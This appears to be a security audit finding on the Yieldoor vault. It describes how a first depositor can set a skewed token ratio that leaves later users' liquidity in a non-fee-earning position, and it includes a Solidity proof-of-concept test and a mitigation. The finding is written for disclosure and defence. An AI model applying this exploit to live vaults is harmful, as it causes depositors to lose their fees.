# Initial price of the vault/strategy can be manipulated by an attacker leading to extreme loss of fees

### Summary

The vault/strategy allocates liquidity to the main position that farms fees as it is within the active liquidity range in the uniswap pool. Any leftover liquidity is added to the secondary position. However, an attacker can be the first depositor in the vault and manipulate the ratio in a way that liquidity will almost all be allocated to the secondary position, making the vault/strategy not earning any fees or very few.

### Root Cause

In `Vault:131/131`, the first deposit can use any [ratio](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L131-L132).

### Internal Pre-conditions

None.

### External Pre-conditions

None.

### Attack Path

1. Attacker deposits liquidity at a very skewed ratio to the vault.
2. Any user that deposits in the vault will have to follow this skewed ratio, leading to the strategy placing most liquidity in the secondary position, which does not earn any fees.

### Impact

Extreme loss of fees at no cost for an attacker. They can trigger this by depositing just a few wei of each token to manipulate the ratio. If another user deposits on top of them, they will deposit according to the wrong ratio and it will be hard to fix the ratio without donating a significant amount of funds. If the attacker makes a slightly larger but non negligeble deposit, any attempt to fix the ratio would mean the attacker gets a significant amount of donated funds.

### PoC

The attacker in the tests deposits 0.001 WBTC and 0.001 USDC, which is a 1-1 ratio, completely incorrect. When the next user deposits according to their slippage protection defined, they will only be able to deposit a very small amount of funds because the expected price is so different. Users may set 0 slippage and deposit anyway, but their positions will not earn fees because most of the liquidity goes to the secondary position which does not earn fees.
```solidity
function test_POC_initialDepositManipulation() public virtual {
    vm.createSelectFork(vm.envString("RPC_URL"));
    vm.startPrank(owner);
    vault = address(new Vault(address(wbtc), address(usdc)));
    strategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
    IVault(vault).setStrategy(strategy);

    address attacker = makeAddr("attacker");
    deal(address(wbtc), attacker, 100000);
    deal(address(usdc), attacker, 1000);
    vm.startPrank(attacker);
    wbtc.approve(vault, type(uint256).max);
    usdc.approve(vault, type(uint256).max);
    IVault(vault).deposit(100000, 1000, 0, 0);

    // make initial deposit
    deal(address(wbtc), user, 1e8);
    deal(address(usdc), user, 100_000e6);

    vm.startPrank(user);
    wbtc.approve(vault, type(uint256).max);
    usdc.approve(vault, type(uint256).max);

    IVault(vault).deposit(1e8, 100_000e6, 0, 0);
    assertEq(wbtc.balanceOf(user), 0);
    assertEq(usdc.balanceOf(user), 99999e6);
}
```

### Mitigation

The initial deposit should follow a certain ratio (such as the TWAP price of the pool).
